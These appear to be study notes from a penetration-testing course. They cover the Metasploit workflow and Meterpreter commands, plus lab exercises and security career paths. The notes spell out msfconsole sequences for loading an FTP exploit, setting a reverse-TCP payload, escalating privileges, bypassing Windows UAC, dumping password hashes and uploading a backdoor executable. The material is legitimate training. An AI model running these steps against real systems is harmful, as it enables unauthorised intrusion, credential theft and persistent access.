Metasploit is an open-source framework used for penetration testing and exploit development, giving a wide array of community contributed exploits and attack vectors that can be used against various systems. Extensible.

Basic workflow:
- Identifying a vulnerable service
- Searching for a proper exploit for that service
- Loading and configuring the exploit
- Loading and configuring the payload you want to use
- Running the exploit code and getting access to the vulnerable machine

A payload is used by an attacker to get:
- An OS Shell
- A VNC or RDP connection
- A Meterpreter shell
- The execution of an attacker-supplied application

A special payload, with many useful features under the pentesting point  of view is `meterpreter`.
```bash
msfconsole
> show -h
> search <searchterm> # search for a specific module by using the search cmd
> search skeleton
> search turboftp
> show exploits # impractical to use
> use exploit/windows/ftp/turboftp_port # to use exploit for turboftp
> info
> show options
> back
> show payloads
> set payload windows/meterpreter/reverse_tcp
> exploit
```

#### <span style="color:red">VIDEO -(12/17) Metasploit</span>
#### <span style="color:red">LAB -(13/17) Metasploit</span>

#### (14/17) Meterpreter - Study Guide

> Ability to:
> - Get a powerful shell on an exploited machine
> - Take control over an exploited machine
> - Install backdoors

Provides advanced features to:
- gather information
- transfer files between the attacker and victim machines
- install backdoors and more
- meterpreter can both wait for a connection on the target machine or connect back to the attacker machine
- a Meterpreter session is an advnaced shell on the target machine
- most used configurations are
  - *bind_tcp*: runs a server process on the target machine that waits for connections from the attacker machine
  - *reverse_tcp*: performs a TCP connection back to the attacker machine (helping to evade firewall rules)

Inside a `msfconsole`:

```bash
> search meterpreter
> set payload windows/meterpreter/reverse_tcp
> exploit
> sessions -l # current opened sessions
> sessions -i 1 # resume session 1
> sysinfo # retrieve info about the exploited machine
> ifconfig # prints the network configuration
> route # routing info
> getuid # which user is running the process exploited
> getsystem # Runs a privilege escalation routine on the target machine

# Bypass UAC (User Account Control policy of modern Windows OSs)
> background # switch from a meterpreter session to the msf console
> search bypassuac
> use exploit/windows/local/bypassuac
> set session 1
> exploit
> getuid

# Dumping the Password Database
> background
> use post/windows/gather/hashdump
> set session 2
> exploit

# Upload / download files
> download HaxLogs.log /root/
> upload /root/backdoor.exe c:\\Windows # note the backslash escaping
> shell
```

#### <span style="color:red">VIDEO - (15/17) Meterpreter</span>
#### <span style="color:red">VIDEO - (16/17) Beyond Remote Code Execution</span>
#### <span style="color:red">VIDEO - (17/17) Shells</span>

### Next Steps (6 items)

#### (1/6) What to do Next - Study Guide

- Each BlackBox Penetration Testing labs contains 2-4 machines that should be exploited
- There are flags per machine
- There could be more valuable information on the machine that could help you compromise additional hosts

> Study and get updated, new exploitation techniques are being discovered daily, start a blog, read feeds.

#### (2/6) Black-box Penetration Test 1
#### (3/6) Black-box Penetration Test 2
#### (4/6) Black-box Penetration Test 3
#### (5/6) Penetration Testing Approach - Study Guide

- Be curious
- Don't be ashamed of not knowing
- Try various methods until you are sure something is really safe
- Use search engines
- You can't remember everything
- Follow some existing penetration testing methodology (as OWASP)
  - So you can show your client what tests will be conducted
#### (6/6) Career Paths - Study Guide

- Web App / Network penetration tester
- Red teamer / Social engineer
- Reverse engineer
- Security researcher
- Mobile application penetration tester

Defense:

- Incident Response team member
- CCERT analyst
- Malware analyst
- Threat hunter
- Secure software developer
- Netowrk and systems defender

## References

- https://kentosec.com/2019/08/04/how-to-pass-the-ejpt/
- XSS Attacks: [hack.me](hack.me)